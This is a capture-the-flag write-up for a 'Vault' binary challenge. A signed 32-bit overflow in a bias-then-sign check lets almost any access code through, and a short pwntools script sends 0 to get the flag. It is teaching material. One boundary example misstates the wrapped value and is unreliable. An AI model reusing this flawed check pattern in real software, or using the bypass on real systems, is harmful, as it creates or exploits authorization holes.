# Vault

`#pwn` `#logic-bug` `#signed-integer-overflow` `#no-memory-corruption`

## 1. Challenge Info

- **Category:** PWN / BIN
- **Difficulty:** Medium
- **Author:** Club CTF Team
- **Points:** 200
- **Connection:** `nc <HOST> 5001`

The vault protects its secrets with a simple arithmetic check. The developer was sure the access calculation could never produce an unexpected result.

## 2. Reconnaissance

```text
$ file vault
vault: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0
```

Nothing here overflows a buffer or corrupts memory — `name` is read with a bounded `fgets`, and the access code comes in through `scanf("%d", ...)`. This one lives entirely in the arithmetic, not the stack layout. checksec doesn't matter for the exploit itself, so recon stays short and the real work is in the logic.

## 3. Reverse Engineering

```c
static void vault(void) {
    char name[32];
    int32_t code;
    int32_t bonus;

    fgets(name, sizeof(name), stdin);
    scanf("%d", &code);

    bonus = code + 0x40000000;
    if (bonus < 0) {
        puts("\n[-] Authorization failed.");
        return;
    }
    if (code == 0x13371337) {
        puts("\n[-] Nice try. That code is disabled.");
        return;
    }
    win();                                  // reads flag.txt and prints it
}
```

Reads like a range check: bias `code` by `0x40000000` (2^30) and reject it if the biased result goes negative. But `bonus` is a **signed 32-bit int**, and that only actually goes negative in two narrow bands:

- `code` is very negative (below roughly `-0x40000000`) — genuinely negative, no overflow.
- `code` is large positive (above roughly `0x3FFFFFFF`) — `code + 0x40000000` overflows past `INT32_MAX` and wraps to negative.

Everything in between — essentially the entire range of ordinary, small integers — passes straight through. The single value the code explicitly blocks (`0x13371337`) is a decoy; nothing else is actually being guarded.

Verified boundary behavior:

```text
code = 0            -> bonus = 0x40000000        (positive) -> vault opens
code = -1073741824  -> bonus = 0                 (positive) -> vault opens
code = 2147483647   -> bonus = -2147483649 wraps (negative) -> rejected
```

## 4. Exploitation

### Phase 1 — pick anything in the accepted band

`code = 0` is comfortably inside the window and isn't the one disabled value. No overflow arithmetic is even required to find it — just recognizing that the "safety" check barely restricts anything.

```python
#!/usr/bin/env python3
from pwn import *

p = remote("HOST", 5001)
p.sendlineafter(b"Username: ", b"player")
p.sendlineafter(b"Access code: ", b"0")
p.interactive()
```

```text
$ printf 'player\n0\n' | ./vault

[+] Vault opened!
[+] Flag: DNCTF{vault_arithmetic_can_break_trust}
```

## 5. Flag

```text
DNCTF{vault_arithmetic_can_break_trust}
```

## 6. Why this matters

Bias-then-sign-check is a real pattern people reach for when they want a "cheap" range check without writing two comparisons — and it's a real source of bugs, because signed overflow silently folds the number line back on itself instead of raising an error. The developer here effectively built an allow-list that covers almost the entire input domain by accident. The takeaway isn't "avoid addition" — it's that any check relying on the *sign* of a computed value needs to account for every value that computation can actually produce, including the ones that wrap.
